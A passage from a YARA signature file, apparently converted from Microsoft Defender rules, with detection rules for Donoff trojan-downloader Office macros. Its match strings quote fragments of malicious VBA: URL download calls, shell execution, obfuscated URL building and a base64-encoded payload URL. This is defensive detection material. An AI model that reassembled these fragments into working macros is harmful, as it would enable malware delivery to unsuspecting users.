        $x_1_2 = "(Chr$(54) & Chr$(70) & Chr$(55) & Chr$(48) & Chr$(54) & Chr$(53) & Chr$(54) & Chr$(69))," ascii //weight: 1
        $x_1_3 = "& Chr$(Val(Chr$(38) & Chr$(72) & Mid$(strData, second, 2)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AE_2147707123_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AE"
        threat_id = "2147707123"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-32] 55 52 4c 20 3d 20 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 45 6e 76 69 72 6f 6e 28 22 54 65 6d 70 22 29 20 26 20 22 5c 22 20 26 20 22 [0-192] 2e 73 63 72 22}  //weight: 1, accuracy: Low
        $x_1_3 = "= URLDownloadToFile(0, URL, WHERE, 0, 0)" ascii //weight: 1
        $x_1_4 = ").Run WHERE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AF_2147707124_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AF"
        threat_id = "2147707124"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"sirlethlp.\"))" ascii //weight: 1
        $x_1_2 = "& \"NlECEcSD.exe\"" ascii //weight: 1
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-192] 2c 20 43 68 72 24 28 30 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "(\"=bpwu/oq/x1" ascii //weight: 1
        $x_1_5 = "\"hspce.stwri\") & \"ll\")" ascii //weight: 1
        $x_1_6 = "etdpl:=p\")" ascii //weight: 1
        $x_1_7 = "(\"cspwtri\")" ascii //weight: 1
        $x_1_8 = {3d 20 30 20 54 6f 20 [0-48] 28 [0-192] 29 20 3d 20 46 69 78 28 28 [0-192] 20 2b 20 31 29 20 2a 20 52 6e 64 29}  //weight: 1, accuracy: Low
        $x_1_9 = {3d 20 30 20 54 6f 20 [0-48] 3d 20 [0-192] 20 2b 20 [0-192] 28 [0-192] 29 [0-16] 4e 65 78 74 20 [0-32] 52 6e 64 20 2d 31 [0-16] 52 61 6e 64 6f 6d 69 7a 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AG_2147707155_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AG"
        threat_id = "2147707155"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"h\" & Chr(116) & Chr(116) & Chr(112) & \":\" & \"/\" & Chr(47) &" ascii //weight: 1
        $x_1_2 = "Chr(104) & Chr(116) & \"t\" & Chr(112) & \":\" & \"/\" & \"/\" &" ascii //weight: 1
        $x_1_3 = "= Environ(\"TMP\") & \"\\\" & StrReverse(\"exe." ascii //weight: 1
        $x_1_4 = {53 68 65 6c 6c 45 78 65 63 75 74 65 57 20 30 26 2c 20 53 74 72 50 74 72 28 22 4f 70 65 6e 22 29 2c 20 53 74 72 50 74 72 28 [0-192] 29 2c 20 53 74 72 50 74 72 28 22 22 29 2c 20 53 74 72 50 74 72 28 22 22 29 2c 20 31}  //weight: 1, accuracy: Low
        $x_1_5 = "URLDownloadToFileA 0&" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AH_2147707196_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AH"
        threat_id = "2147707196"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fromArr() As Variant, LenLen As Integer" ascii //weight: 1
        $x_1_2 = "result = result & Chr(fromArr(i) - LenLen + i * 2)" ascii //weight: 1
        $x_1_3 = "Array(146, 156, 154, 148, 92, 79" ascii //weight: 1
        $x_1_4 = ".Open \"GE\" + figaro + \"T\", Hlopushka, False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AI_2147707227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AI"
        threat_id = "2147707227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "+ \".exe" ascii //weight: 1
        $x_1_2 = "= \"Scriptin\" + \"g.FileS\" +" ascii //weight: 1
        $x_1_3 = "= \"Ht\" + \"t\" + \"p\" + \"." ascii //weight: 1
        $x_1_4 = ".Status = 50 + 50 + 100 Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AJ_2147707306_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AJ"
        threat_id = "2147707306"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ChrW(99 + 5) & ChrW(111 + 5) & ChrW(111 + 5) & ChrW(107 + 5) & ChrW(53 + 5) & ChrW(42 + 5) & ChrW(42 + 5)" ascii //weight: 1
        $x_1_2 = "Chr$(116) & Chr$(116) & Chr$(112) & Chr$(58)" ascii //weight: 1
        $x_2_3 = "Chr$(102) & Chr$(116) & Chr$(46) & Chr$(88) & Chr$(77)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_AK_2147707387_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AK"
        threat_id = "2147707387"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-192] 28 43 68 72 28 [0-12] 29 20 2b 20 43 68 72 28 [0-12] 29 20 2b 20 43 68 72 28 [0-12] 29 20 2b}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 4f 70 65 6e 20 [0-192] 28 43 68 72 28 [0-12] 29 20 2b 20 43 68 72 28 [0-12] 29 20 2b 20 43 68 72 28 [0-12] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {53 74 72 43 6f 6e 76 28 [0-192] 2e 72 65 73 50 6f 6e 73 65 62 6f 64 59 2c 20 76 62 55 6e 69 63 6f 64 65 29 2c 20 [0-192] 28 43 68 72 28}  //weight: 1, accuracy: Low
        $x_1_4 = {22 29 29 2e 52 75 6e 20 22 22 22 22 20 26 20 [0-192] 20 26 20 22 22 22 22}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-192] 28 43 68 72 28 [0-12] 29 20 2b 20 43 68 72 28 [0-12] 29 20 2b 20 43 68 72 28 [0-12] 29 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AL_2147707559_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AL"
        threat_id = "2147707559"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fromArr() As Variant, LenLen As Integer" ascii //weight: 1
        $x_1_2 = "result = result & Chr(fromArr(i) - 2 * LenLen - i *" ascii //weight: 1
        $x_1_3 = "Push_E + Push_M + Push_P" ascii //weight: 1
        $x_1_4 = ".Open \"GET\", GetStringFromArray(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AM_2147707828_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AM"
        threat_id = "2147707828"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"Microsoft\" + \".XMLHTTP\")" ascii //weight: 1
        $x_1_2 = {72 65 73 75 6c 74 20 3d 20 72 65 73 75 6c 74 20 26 20 43 68 72 28 [0-16] 28 69 29 20 2d 20 [0-16] 20 2d 20 32 38 34 35 29}  //weight: 1, accuracy: Low
        $x_1_3 = {75 72 6c 41 72 20 3d 20 41 72 72 61 79 28 ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 [0-16] 28 75 72 6c 41 72 2c 20 [0-4] 29 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AN_2147707893_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AN"
        threat_id = "2147707893"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal" ascii //weight: 1
        $x_1_2 = ".ExpandEnvironmentStrings(\"%TEMP%\") +" ascii //weight: 1
        $x_1_3 = " = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "To Len(\"o{{wA66" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AO_2147707935_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AO"
        threat_id = "2147707935"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= DecodeBase64(\"VEVNUA==\")" ascii //weight: 1
        $x_1_2 = "(\"XGV4Y2VscGx1Z2luLmV4ZQ==\")" ascii //weight: 1
        $x_1_3 = "TVNYTUwyLlhNTEhUVFA=" ascii //weight: 1
        $x_1_4 = "(\"R0VU\")" ascii //weight: 1
        $x_1_5 = "thefile = Environ(tempe) & filee" ascii //weight: 1
        $x_1_6 = "Shell thefile, vbMaximizedFocus" ascii //weight: 1
        $x_1_7 = "aHR0cDovL3d3dy5hZG9iZWFpci5uZXQvMS5kYXQ=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AP_2147708207_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AP"
        threat_id = "2147708207"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 53 74 72 43 6f 6e 76 28 10 00 2c 20 28 36 34 20 2b 20 02 00 20 2b 20 36 34 20 2d 20 01 29 29 0d 0a}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 46 61 6c 73 65 20 54 68 65 6e 20 18 00 20 3d 20 30 3a 20 18 00 20 3d 20 4e 6f 74 20 28 01 29 0d 0a 49 66 20 00 20 3e 20 28 31 34 32 2e 35 20 2b 20 02 00 20 2b 20 31 34 32 2e 35 20 2d 20 04 29 20 41 6e 64 20 01 20 3d 20 54 72 75 65 20 54 68 65 6e 20 00 20 3d 20 28 32 2e 35 20 2b 20 02 00 20 2b 20 32 2e 35 20 2d 20 08 29 3a 20 01 20 3d 20 4e 6f 74 20 28 01 29 0d 0a 18 00 28 18 00 29 20 3d 20 28 0c 28 0d 29 20 58 6f 72 20 28 18 00 28 00 29 20 58 6f 72 20 18 00 28 18 00 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 0d 0a 18 00 20 3d 20 03 00 0d 0a 44 69 6d 20 18 00 20 41 73 20 53 74 72 69 6e 67 2c 20 18 00 28 29 20 41 73 20 53 74 72 69 6e 67 2c 20 18 00 20 41 73 20 49 6e 74 65 67 65 72 0d 0a 18 00 20 3d 20 03 00 0d 0a 02 20 3d 20 02 20 26 20 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? (30|2d|39|2c) (30|2d|39|2c)}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AQ_2147708230_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AQ"
        threat_id = "2147708230"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".CreateObject(\"WScr\" + \"ipt.She\" + Mid(" ascii //weight: 1
        $x_1_2 = "ExpandEnvironmentStrings\", VbMethod, \"%temp%\")" ascii //weight: 1
        $x_1_3 = "= StrReverse(\"TEG\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147708249_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR"
        threat_id = "2147708249"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal" ascii //weight: 1
        $x_1_2 = " To Len(\"" ascii //weight: 1
        $x_1_3 = "= Mid(\"" ascii //weight: 1
        $x_1_4 = ".ExpandEnvironmentStrings(StrReverse(\"%PMET%\")) +" ascii //weight: 1
        $x_1_5 = "= Chr(Asc(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AS_2147708485_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AS"
        threat_id = "2147708485"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Lib \"urlmon\" Alias \"URLDownloadToFileW\" (ByVal" ascii //weight: 1
        $x_1_2 = "Lib \"shell32.dll\" Alias \"ShellExecuteW\" (ByVal" ascii //weight: 1
        $x_1_3 = {3d 20 22 68 74 74 70 3a 2f 2f [0-24] 2f [0-48] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 45 6e 76 69 72 6f 6e 28 22 [0-16] 22 29 20 26 20 22 5c [0-16] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_5 = "(0, StrPtr(\"Open\")," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AT_2147708589_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AT"
        threat_id = "2147708589"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "third = (third + first(third) + 1) Mod 256" ascii //weight: 1
        $x_1_2 = "Xor first(Temp + first((third + first(third)) Mod" ascii //weight: 1
        $x_1_3 = "Set WshShell = CreateObject(" ascii //weight: 1
        $x_1_4 = "= WshShell.ExpandEnvironmentStrings(" ascii //weight: 1
        $x_1_5 = {73 2e 4d 6f 64 65 20 3d 20 33 0d 0a 73 2e 54 79 70 65 20 3d 20 32 0d 0a 73 2e 4f 70 65 6e 0d 0a}  //weight: 1, accuracy: High
        $x_1_6 = "Call s.SaveToFile(" ascii //weight: 1
        $x_1_7 = "WshShell.Run" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AU_2147708648_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AU"
        threat_id = "2147708648"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4c 69 62 20 22 75 72 6c 6d 6f 6e 22 20 41 6c 69 61 73 20 22 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 ?? 22 20 28 42 79 56 61 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {4c 69 62 20 22 73 68 65 6c 6c 33 32 2e 64 6c 6c 22 20 41 6c 69 61 73 20 22 53 68 65 6c 6c 45 78 65 63 75 74 65 ?? 22 20 28 42 79 56 61 6c}  //weight: 1, accuracy: Low
        $x_1_3 = "patch_to_my_file = \"http:\" & a & a &" ascii //weight: 1
        $x_1_4 = "tmp_folder = a & \"\\\" & Mid(URL, InStrRev(URL, \"/\") + 1, Len(URL))" ascii //weight: 1
        $x_1_5 = ".obf_runner file_to_save, content, remoteurl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AV_2147708649_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AV"
        threat_id = "2147708649"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 52 65 70 6c 61 63 65 28 22 [0-64] 22 2c 20 22 [0-5] 22 2c 20 22 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 45 6e 76 69 72 6f 6e 6d 65 6e 74 28 52 65 70 6c 61 63 65 28 22 [0-64] 22 2c 20 22 [0-5] 22 2c 20 22 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 20 [0-16] 2c 20 52 65 70 6c 61 63 65 28 22 [0-64] 22 2c 20 22 [0-5] 22 2c 20 22 22 29 2c 20 56 62 4d 65 74 68 6f 64 2c 20 [0-16] 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_4 = {69 6e 74 53 74 61 74 75 73 20 3d 20 69 6e 74 53 74 61 74 75 73 20 26 20 43 68 72 28 50 72 6f 70 4d 67 72 28 69 29 20 2d 20 [0-4] 20 2a 20 44 65 6c 65 74 65 32 20 2d 20 [0-4] 20 2d 20 [0-4] 20 2d 20 [0-4] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {52 65 70 6c 61 63 65 28 22 5c [0-16] 2e 74 78 74 22 2c 20 22 74 22 2c 20 22 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AW_2147708797_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AW"
        threat_id = "2147708797"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 43 68 72 24 28 ?? ?? ?? 29 20 2b 20 43 68 72 24 28 ?? ?? ?? 29 20 2b 20 43 68 72 24 28 ?? ?? ?? 29 20 2b 20 43 68 72 24 28 ?? ?? ?? 29 20 2b 20 43 68 72 24 28 ?? ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 74 72 43 6f 6e 76 28 [0-16] 28 29 2c 20 28 03 00 20 2b 20 03 00 20 2b 20 03 00 20 2d 20 03 00 20 2b 20 03 00 20 2b 20 03 00 20 2b 20 03 00 20 2d 20 03 00 29 20 2b 20 28 03 00 20 2b 20 03 00 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 31 20 54 68 65 6e 20 44 65 62 75 67 2e 41 73 73 65 72 74 20 4e 6f 74 20 10 00 28 03 00 29}  //weight: 1, accuracy: Low
        $x_1_4 = {46 6f 72 20 [0-16] 20 3d 20 30 20 54 6f 20 28 03 00 20 2b 20 03 00 20 2b 20 03 00 20 2d 20 03 00 20 2b 20 03 00 20 2b 20 03 00 20 2b 20 03 00 20 2d 20 03 00 20 2d 20 03 00 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 28 49 6e 74 28 [0-20] 20 2f 20 28 03 00 20 5e 20 28 03 00 20 2a 20 28 03 00 20 2d 20 [0-20] 29 29 29 29 29 20 41 6e 64 20 28 28 03 00 20 5e 20 03 00 29 20 2d 20 03 00 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AX_2147708861_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AX"
        threat_id = "2147708861"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 53 74 61 74 75 73 20 3d 20 28 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 29 20 54 68 65 6e 20 47 6f 54 6f}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 28 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {49 66 20 28 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 20 2d 20 [0-4] 29 20 3d 20 28 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2b 20 [0-4] 20 2d 20 [0-4] 20 2d 20 [0-4] 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AY_2147709000_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AY"
        threat_id = "2147709000"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Then GoTo Decrypt" ascii //weight: 1
        $x_1_2 = {26 20 43 68 72 24 28 41 73 63 28 4d 69 64 24 28 [0-15] 2c 20 49 2c 20 31 29 29 20 2b 20 41 73 63 28 4d 69 64 24 28 [0-15] 2c 20 4a 2c 20 31 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".SaveToFile" ascii //weight: 1
        $x_1_4 = ".Mode = 3" ascii //weight: 1
        $x_1_5 = "WshShell.Run" ascii //weight: 1
        $x_1_6 = "= WshShell.ExpandEnvironmentStrings(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AZ_2147709043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AZ"
        threat_id = "2147709043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 45 6e 76 69 72 6f 6e 28 43 68 72 57 28 38 34 29 20 26 20 43 68 72 57 28 36 39 29 20 2b 20 43 68 72 57 28 37 37 29 20 26 20 43 68 72 57 28 38 30 29 29 20 26 20 [0-16] 2e 54 65 78 74 42 6f 78}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 2e 54 65 78 74 42 6f 78 [0-1] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 4f 70 65 6e 20 43 68 72 57 28 37 31 29 20 26 20 43 68 72 57 28 36 39 29 20 2b 20 43 68 72 57 28 38 34 29 2c 20 [0-16] 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 70 65 6e 20 [0-16] 20 46 6f 72 20 42 69 6e 61 72 79 20 41 63 63 65 73 73 20 57 72 69 74 65 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_5 = {20 3d 20 53 68 65 6c 6c 28 [0-16] 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BA_2147709138_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BA"
        threat_id = "2147709138"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Const DMC = \" c/ dmc" ascii //weight: 1
